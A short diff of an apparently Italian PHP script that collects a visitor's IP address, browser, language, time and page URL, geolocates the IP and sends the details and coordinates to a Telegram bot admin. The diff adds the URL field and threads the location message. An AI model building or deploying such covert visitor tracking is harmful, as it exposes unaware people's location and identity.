@@ -35,6 +35,7 @@ Ip: $ip
 Browser: $userAgent
 Lingua: $accept
 Giorno & Ora : $today
+Url: $script_url
 ";
 
 $res = get_ip_info($ip);
@@ -50,9 +51,12 @@ $first_message = sendMessage($bot_admin_id, $message);
 
 if ($res !== null){
 	sendLocation(
-		$chat_id=$bot_admin_id, 
-		$latitude=(float)$res['lat'], 
-		$longitude=(float)$res['lon']
+		$bot_admin_id, 
+		(float)$res['lat'], 
+		(float)$res['lon'],
+        null,
+        false,
+        (int)$first_message['result']['message_id']
 	);
 }
 
